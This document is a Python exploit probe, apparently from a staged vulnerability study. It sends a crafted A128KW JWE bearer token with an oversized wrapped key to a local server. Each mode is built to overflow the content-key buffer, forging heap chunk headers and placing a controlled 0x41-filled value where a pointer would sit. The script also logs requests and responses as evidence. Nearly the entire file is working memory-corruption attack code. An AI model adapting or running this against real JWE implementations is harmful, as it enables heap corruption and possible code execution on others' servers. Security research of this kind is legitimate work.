#!/usr/bin/env python3
"""W217 bounded probe: one crafted A128KW bearer JWE to 127.0.0.1:18444.

Modes:
  safe  : correct 40-byte wrapped key, 32 chosen marker bytes (control).
  ptr   : 80-byte raw key, W215's 72-byte write (known no live target).
  zero  : 152-byte raw key, 144-byte write whose far fields are zero.
  long  : 152-byte raw key, 144-byte write preserving both 0x41 chunk
          headers and the object-like (1,1) header at cek+0x70, then
          placing 0x4141414141414141 at cek+0x88.
"""
import os
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from probe import token

HOST = "127.0.0.1"
PORT = int(os.environ.get("W2_PORT", "18444"))
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
TAG = os.environ.get("W2_TAG", "w217")
KEK = bytes.fromhex(os.environ.get("W2_KEK", "30313233343536373839616263646566"))

mode = sys.argv[1]
if mode == "safe":
    ek_len = 40
    plain = bytearray(b"MISHE-W217-SAFE".ljust(32, b"-"))
elif mode == "ptr":
    ek_len = 80
    plain = bytearray(72)
    plain[0:32] = b"MISHE-W217-PTR".ljust(32, b"-")
    plain[32:40] = b"\x00" * 8
    plain[40:48] = struct.pack("<Q", 0x41)
    plain[48:56] = struct.pack("<II", 2, 1)
    plain[56:64] = struct.pack("<Q", 16)
    plain[64:72] = struct.pack("<Q", 0x4141414141414141)
else:
    ek_len = 152
    plain = bytearray(144)
    plain[0:32] = b"MISHE-W217-LONG".ljust(32, b"-")
    plain[32:40] = b"\x00" * 8           # first 0x41 chunk prev_size
    plain[40:48] = struct.pack("<Q", 0x41)  # first 0x41 chunk size
    plain[0x60:0x68] = b"\x00" * 8       # second 0x41 chunk prev_size
    plain[0x68:0x70] = struct.pack("<Q", 0x41)  # second 0x41 chunk size
    plain[0x70:0x78] = struct.pack("<II", 1, 1)  # preserve object-like header
    if mode == "long":
        plain[0x88:0x90] = struct.pack("<Q", 0x4141414141414141)

tok = token(ek_len, kek=KEK, plaintext=bytes(plain))
req = (
    b"GET /private HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"User-Agent: w2-w217-probe\r\n"
    b"Authorization: Bearer " + tok.encode("ascii") + b"\r\n"
    b"Connection: close\r\n\r\n"
)
with open(os.path.join(EVIDENCE, "%s-%s-request.bin" % (TAG, mode)), "wb") as f:
    f.write(req)
with open(os.path.join(EVIDENCE, "%s-%s-token.txt" % (TAG, mode)), "w") as f:
    f.write(tok + "\n")
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.sendall(req)
    chunks = []
    while True:
        data = s.recv(4096)
        if not data:
            break
        chunks.append(data)
resp = b"".join(chunks)
with open(os.path.join(EVIDENCE, "%s-%s-response.bin" % (TAG, mode)), "wb") as f:
    f.write(resp)
print("W217_MODE=%s EK_RAW_LEN=%d PLAIN_FAR=%s RESPONSE=%r" %
      (mode, ek_len, bytes(plain)[0x70:0x90].hex(), resp[:120]))
